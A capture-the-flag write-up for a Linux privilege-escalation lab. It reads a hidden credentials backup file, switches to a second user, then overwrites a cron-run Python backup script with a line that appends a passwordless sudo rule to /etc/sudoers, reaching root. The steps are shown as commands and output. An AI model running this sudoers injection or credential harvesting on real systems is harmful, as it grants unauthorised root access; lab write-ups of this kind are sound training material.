# Privesc Linux - 2

## Initial Access

The lab provides SSH credentials.

```bash
ssh ctfplayer@<IP_MACHINE>
# password: ctfplayer2026
```

## Enumeration

```bash
ls -la ~
```

Hidden files and directories are present, including `.config`.

```bash
ls -la ~/.config/app/
```

Hidden file found: `.credentials.bak`

```bash
cat ~/.config/app/.credentials.bak
```

```
# Serviço: servidor-interno
# Usuário: sysadmin
# Senha: S3********
# TODO: migrar para vault
```

## Lateral Movement

```bash
su sysadmin
# password from .credentials.bak
cd ~
ls
cat user.txt
```

**User flag:** `hackingclub{l4t...}`

```bash
cat notes.txt
```

```
TAREFAS:
- [x] Configurar backup automático
- [ ] Revisar permissões dos scripts em /opt/scripts
- [ ] Verificar se o cron está funcionando (checar /var/log/backup.log)
- [ ] Remover credenciais hardcoded

IMPORTANTE: O backup roda automaticamente. Não modificar sem avisar o time.
```

## Privilege Escalation

Backup script location: `/opt/scripts/backup.py`  
Executed via cron (approximately every 1 minute)  
Logs: `/var/log/backup.log`

```bash
ls -la /opt/scripts/
cat /var/log/backup.log
```

**Exploitation:** Modify `backup.py` to add `sysadmin` to sudoers.

```bash
cp /opt/scripts/backup.py /tmp/backup.py.bak
```

```bash
echo 'import os
os.system("echo '\''sysadmin ALL=(ALL) NOPASSWD:ALL'\'' >> /etc/sudoers")' > /opt/scripts/backup.py
```

Wait ~1 minute for cron execution.

```bash
sudo -l
sudo su
whoami
```

```
root
```

## Root Flag

```bash
cat /root/root.txt
```

**Root flag:** `hackingclub{cr0t...}`

## Summary

| Step | Action | Result |
|------|--------|--------|
| Initial Access | SSH as `ctfplayer` | Low privilege shell |
| Enumeration | `~/.config/app/.credentials.bak` | `sysadmin` credentials |
| Lateral Movement | `su sysadmin` | User flag |
| Escalation | Overwrite `/opt/scripts/backup.py` | `sysadmin` in sudoers |
| Root | `sudo su` | Root flag |
